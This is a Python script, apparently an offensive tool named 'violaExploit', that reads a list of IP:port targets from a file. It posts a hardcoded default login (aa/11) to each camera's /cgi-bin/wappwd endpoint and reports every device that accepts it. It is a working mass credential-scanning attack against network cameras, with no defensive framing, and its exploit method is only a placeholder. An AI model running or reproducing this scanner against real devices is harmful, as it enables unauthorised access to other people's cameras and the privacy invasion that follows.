import re , os , sys , requests
import urllib.request
class violaExploit:
    def violaExploit(self):
        print("[-]Work In Progress...")
    def violaBruteForce(self):
        expression = 'incorrect'
        ok = "OK"
        username = 'aa'
        password = '111'
        data = {'WAPLOGIN': username, 'WAPPASSWORD': password , 'PIC_SIZE': 'RES_0', 'FILEOK': 'camera.htm', 'FILEFAIL':'denied.htm', 'Submit': ok  }
        pathOs = os.path.abspath(os.path.dirname(sys.argv[0]))
        #vulnerable_host = open(pathOs + '/Host/up_host.txt', 'r').read().splitlines()
        vulnerable_host = open(pathOs + '/Host/host.txt', 'r').read().splitlines()
        pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        pattern_2 = r'(\:).*'
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                match1 = re.search(pattern_1, res)
                match2 = re.search(pattern_2, res)
                host = match1.group()
                port_raw = match2.group()
                port = port_raw[1:]
                postData = b"FILEOK=camera.htm&FILEFAIL=denied.htm&PIC_SIZE=RES_0&Submit=OK&WAPLOGIN=aa&WAPPASSWORD=11"
                url='http://' + str(host) + ':' + str(port) + "/cgi-bin/wappwd"
                response = urllib.request.urlopen(url ,postData)
                if "DENIED" in str(response.read()):
                    pass
                else:
                    print("[-] Found  http://{0}:{1} with credential aa:11".format(host, port))
            except KeyboardInterrupt:
                pass
            except requests.exceptions.ConnectionError:
                pass
            except requests.exceptions.ChunkedEncodingError:
                pass
            except urllib.error.URLError:
                pass
            except TimeoutError:
                pass
            except ConnectionResetError:
                pass
            except AttributeError:
                pass
            a += 1
